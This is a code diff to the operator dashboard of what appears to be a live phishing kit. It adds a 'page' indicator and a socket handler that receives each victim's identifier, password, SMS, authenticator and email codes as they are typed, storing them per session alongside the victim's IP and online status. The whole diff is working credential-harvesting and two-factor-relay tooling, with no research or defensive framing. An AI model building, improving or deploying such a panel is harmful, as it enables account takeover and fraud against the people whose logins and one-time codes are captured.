@@ -236,7 +236,7 @@
      if (sessionsData[sid]) {
   sessionsData[sid].ip = ip;
 } else {
-  sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+  sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
 }
 const data = sessionsData[sid];
 
@@ -263,9 +263,20 @@ const data = sessionsData[sid];
       idValue.textContent = data.identifier;
       idSpan.appendChild(idValue);
 
+      const pageSpan = document.createElement('span');
+      pageSpan.style.marginLeft = '10px';
+      pageSpan.style.fontWeight = 'bold';
+      pageSpan.style.padding = '2px 6px';
+      pageSpan.style.borderRadius = '4px';
+      pageSpan.style.background = '#333';
+      pageSpan.style.fontSize = '12px';
+      pageSpan.id = `page-${sid}`;
+      pageSpan.textContent = data.page ? `📄 ${data.page}` : '';
+
       info.appendChild(statusDot);
       info.appendChild(text);
       info.appendChild(idSpan);
+      info.appendChild(pageSpan);
 
       const del = document.createElement('button');
       del.className = 'delete-btn';
@@ -331,6 +342,7 @@ const data = sessionsData[sid];
       info.appendChild(headerRow);
 
       const fields = [
+        { label: 'Page', key: 'page' },
         { label: 'Identifier', key: 'identifier' },
         { label: 'Password', key: 'password' },
         { label: 'SMS', key: 'sms' },
@@ -445,7 +457,40 @@ const data = sessionsData[sid];
       requestAnimationFrame(() => { toast.style.opacity = '0'; });
       setTimeout(() => toast.remove(), 3000);
     }
+const clientDataTypeMap = {
+      'identifier': 'identifier',
+      'password': 'password',
+      'sms': 'sms',
+      'gauth': 'gauth',
+      'email-code': 'email-code',
+      'page': 'page'
+    };
 
+    socket.on('client-data', payload => {
+      const sid = normalizeId(payload.sessionID || payload.sessionId || payload.session);
+      if (getDeletedSessionsSet().has(sid)) return;
+
+      const type = String(payload.type || '').toLowerCase();
+      const key = clientDataTypeMap[type];
+      if (!key) return;
+
+      const value = String(payload.data || payload.value || '');
+      if (!sessionsData[sid]) {
+        sessionsData[sid] = { ip: '', identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
+      }
+      sessionsData[sid][key] = value;
+
+      if (key === 'page') {
+        const pageEl = document.getElementById(`page-${sid}`);
+        if (pageEl) pageEl.textContent = value ? `📄 ${value}` : '';
+      }
+
+      const smallVal = document.getElementById(`${key}-${sid}`);
+      if (smallVal) smallVal.textContent = value;
+
+      if (currentDetailSession === sid) buildDetailPanel(sid);
+      saveSessionData();
+    });
     const dataHandlers = {
       'client-identifier': 'identifier',
       'client-password': 'password',
@@ -471,7 +516,7 @@ const data = sessionsData[sid];
     if (deletedSet.has(sid)) return;
 
     if (!sessionsData[sid]) {
-      sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+      sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
     } else {
       sessionsData[sid].ip = ip;
       sessionsData[sid].status = 'online';
@@ -505,7 +550,7 @@ const data = sessionsData[sid];
       const sid = normalizeId(sessionID);
       if (getDeletedSessionsSet().has(sid)) return; // guard
 
-      sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+      sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
       sessionsData[sid].status = 'online';
       sessionsData[sid].ip = ip;
       const existing = document.getElementById(`session-${sid}`);
@@ -552,7 +597,7 @@ const data = sessionsData[sid];
           saveSessionData();
         } else {
           // If the session doesn't exist yet, create a minimal entry (but only if not deleted)
-          sessionsData[sid] = { ip: payload.ip || '', identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
+          sessionsData[sid] = { ip: payload.ip || '', identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
           sessionsData[sid][key] = value;
           saveSessionData();
         }
@@ -567,6 +612,8 @@ const data = sessionsData[sid];
         events.forEach(evt => {
           if (dataHandlers[`client-${evt.type}`]) {
             sessionsData[sid][dataHandlers[`client-${evt.type}`]] = evt.data;
+          } else if (clientDataTypeMap[evt.type]) {
+            sessionsData[sid][clientDataTypeMap[evt.type]] = evt.data;
           }
         });
         if (currentDetailSession === sid) {
